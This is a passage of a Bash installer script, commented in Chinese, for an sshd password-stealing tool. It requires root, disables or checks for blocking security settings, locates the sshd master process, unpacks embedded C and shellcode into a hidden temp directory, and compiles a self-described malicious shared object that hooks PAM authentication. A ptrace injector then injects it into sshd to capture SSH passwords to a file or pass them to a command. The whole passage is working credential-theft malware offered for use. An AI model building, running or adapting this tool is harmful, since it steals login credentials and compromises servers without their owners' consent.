    exit 0
fi

# ---------------- 环境预检 ----------------

[ "$(id -u)" = 0 ] || die "需要 root 权限 (ptrace 注入 sshd)"

case "$(uname -m)" in
    x86_64)          srcdir=x86_64; with_shellcode=1 ;;
    aarch64|arm64)   srcdir=arm;    with_shellcode=0 ;;
    *)               die "不支持的架构: $(uname -m) (当前支持 x86_64 / aarch64)" ;;
esac
info "架构: $(uname -m) -> 使用 $srcdir 源码"

command -v gcc >/dev/null 2>&1 || die "未找到 gcc, 请先安装 (Debian/Ubuntu: apt install build-essential; EL: dnf install gcc)"

if ldd --version 2>&1 | head -1 | grep -qi musl; then
    die "musl 环境: sshd 通常未启用 PAM, 本工具不适用"
fi

[ -f /etc/pam.d/sshd ] || die "/etc/pam.d/sshd 不存在: sshd 未启用 PAM, 本工具不适用"

if command -v getenforce >/dev/null 2>&1 && getenforce 2>/dev/null | grep -qi enforcing; then
    die "SELinux 处于 enforcing, ptrace 注入会被拦截, 请先 setenforce 0"
fi

[ "$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)" = "3" ] && \
    die "yama ptrace_scope=3 已完全禁用 ptrace, 无法注入"

# sshd 运行配置检查(尽力而为, 失败不阻断)
sshd_bin=$(command -v sshd || echo /usr/sbin/sshd)
if cfg=$("$sshd_bin" -T 2>/dev/null); then
    echo "$cfg" | grep -qi '^usepam no' && die "sshd 配置 UsePAM no: 本工具依赖 pam_unix 认证流程"
    echo "$cfg" | grep -qi '^passwordauthentication no' && \
        warn "sshd 未开启密码认证(PasswordAuthentication no), 将抓不到任何密码"
else
    warn "sshd -T 解析失败, 跳过 UsePAM/密码认证预检"
fi

ls /usr/lib*/security/pam_unix.so /lib*/security/pam_unix.so 2>/dev/null | head -1 >/dev/null || \
    warn "常见路径未找到 pam_unix.so, 若认证栈不含 pam_unix 将无法捕获"

[ ${#payload} -lt 255 ] || die "payload 长度需小于 255"
case "$mode" in 0|1) ;; *) die "-m 仅支持 0(写文件) 或 1(命令执行)" ;; esac
[ "$mode" = 1 ] && case "$payload" in *%s*%s*) ;; *) die "命令模式(-m 1)的 payload 需包含两个 %s" ;; esac

# ---------------- sshd 主进程 pid 探测 ----------------
# 优先级: -s 手动指定 > systemd MainPID > ps [listener] 标题(OpenSSH>=8.9)
#         > 退化模式(最早的 root sshd 常驻进程, 会给出警告)

if [ -n "$sshd_pid" ]; then
    kill -0 "$sshd_pid" 2>/dev/null || die "-s 指定的 pid $sshd_pid 不存在"
    info "使用手动指定的 sshd pid: $sshd_pid"
else
    if command -v systemctl >/dev/null 2>&1; then
        for unit in ssh sshd sshd.service; do
            p=$(systemctl show -p MainPID "$unit" 2>/dev/null | tail -1)
            p=${p#MainPID=}
            if [ -n "$p" ] && [ "$p" != "0" ] && kill -0 "$p" 2>/dev/null; then
                sshd_pid=$p
                break
            fi
        done
    fi
    if [ -z "$sshd_pid" ] && command -v ps >/dev/null 2>&1; then
        sshd_pid=$(ps -ef 2>/dev/null | grep sshd | grep '\[listener\]' | grep -v grep | awk '{print $2}' | head -1)
    fi
    if [ -z "$sshd_pid" ] && command -v ps >/dev/null 2>&1; then
        # 退化模式: root 的 sshd 常驻进程(排除 "sshd: xxx@pts" 会话子进程), 取最早一个
        sshd_pid=$(ps -eo pid=,user=,args= 2>/dev/null | awk '$2=="root" && $3 ~ /sshd/ && $0 !~ /sshd: / {print $1}' | head -1)
        [ -n "$sshd_pid" ] && \
            warn "低精度 pid 探测(OpenSSH<8.9 无 [listener] 标题): 选中 $sshd_pid, 若有多个 sshd 进程请用 -s 确认"
    fi
    [ -n "$sshd_pid" ] || die "未找到 sshd 主进程 (systemd socket 激活? ), 请用 -s 手动指定"
    info "探测到 sshd 主进程 pid: $sshd_pid"
fi

# ---------------- 解包内嵌源码 ----------------

workdir=$(mktemp -d /tmp/.shb.XXXXXX) || die "创建临时目录失败"
cleanup() {
    if [ "$keep_build" = 1 ]; then
        info "保留编译目录: $workdir (--keep-build)"
    else
        rm -rf "$workdir"
    fi
}
trap cleanup EXIT INT TERM

printf '%s' "$PAYLOAD_B64" | base64 -d 2>/dev/null | tar -xzf - -C "$workdir" 2>/dev/null \
    || die "内嵌源码解包失败 (文件损坏?)"
[ -f "$workdir/$srcdir/sshdHooker.c" ] || die "解包不完整: 缺少 $srcdir/sshdHooker.c"

# ---------------- 编译(配置经 -D 宏注入, 不改动源码) ----------------

# C 字符串字面量转义: 反斜杠与双引号
c_escape() { printf '%s' "$1" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g'; }

info "编译恶意 so -> $evil_so_path"
gcc -shared "$workdir/$srcdir/inject_got.c" -o "$evil_so_path" -ldl -fPIC -std=c99 \
    -DSEND_MODE_DEFAULT="$mode" \
    -DSEND_TARGET_DEFAULT="\"$(c_escape "$payload")\"" \
    -DEVIL_SO_PATH_DEFAULT="\"$(c_escape "$evil_so_path")\"" \
    -DSILENT_MODE_DEFAULT="$silent_mode" \
    -DSILENT_USER_DEFAULT="\"$(c_escape "$silent_user")\"" \
    || die "恶意 so 编译失败 (加 --keep-build 保留 $workdir 排查)"

inject_srcs="$workdir/$srcdir/sshdHooker.c"
[ "$with_shellcode" = 1 ] && inject_srcs="$inject_srcs $workdir/$srcdir/shellcode.s"
info "编译注入器 -> $inject_bin"
# shellcheck disable=SC2086
gcc $inject_srcs -g -o "$inject_bin" -ldl -lpthread \
    -DEVIL_SO_PATH_DEFAULT="\"$(c_escape "$evil_so_path")\"" \
    ${libc_string:+-DLIBC_PATTERN_DEFAULT="\"$(c_escape "$libc_string")\""} \
    || die "注入器编译失败 (加 --keep-build 保留 $workdir 排查)"

[ -x "$inject_bin" ] && [ -f "$evil_so_path" ] || die "编译产物校验失败"

# ---------------- 启动注入器并自检 ----------------

if [ -f "$state_file" ]; then
    oldpid=$(grep '^injector_pid=' "$state_file" | cut -d= -f2-)
    kill -0 "$oldpid" 2>/dev/null && { warn "已有注入器在运行(pid=$oldpid), 先停止"; kill "$oldpid" 2>/dev/null; sleep 1; }
fi

info "启动注入器 (sshd pid=$sshd_pid)..."
nohup "$inject_bin" "$sshd_pid" >"$injector_log" 2>&1 &
inj_pid=$!

sleep 2
if ! kill -0 "$inj_pid" 2>/dev/null; then
    tail -5 "$injector_log" 2>/dev/null
    die "注入器启动后即退出, 完整日志: $injector_log"
fi
if grep -q 'Attach failed\|Attach Failed' "$injector_log" 2>/dev/null; then
    tail -5 "$injector_log" 2>/dev/null
    kill "$inj_pid" 2>/dev/null
    die "注入器 attach sshd($sshd_pid) 失败, 请确认 pid 是否为 sshd 主进程"
fi

cat > "$state_file" <<EOF
inject_bin=$inject_bin
evil_so_path=$evil_so_path
injector_pid=$inj_pid
sshd_pid=$sshd_pid
log=$injector_log
EOF

info "注入成功: 注入器 pid=$inj_pid, sshd pid=$sshd_pid"
info "验证: 用密码 SSH 登录本机一次, 然后: cat $payload"
info "管理: bash $0 --status / bash $0 --uninstall"
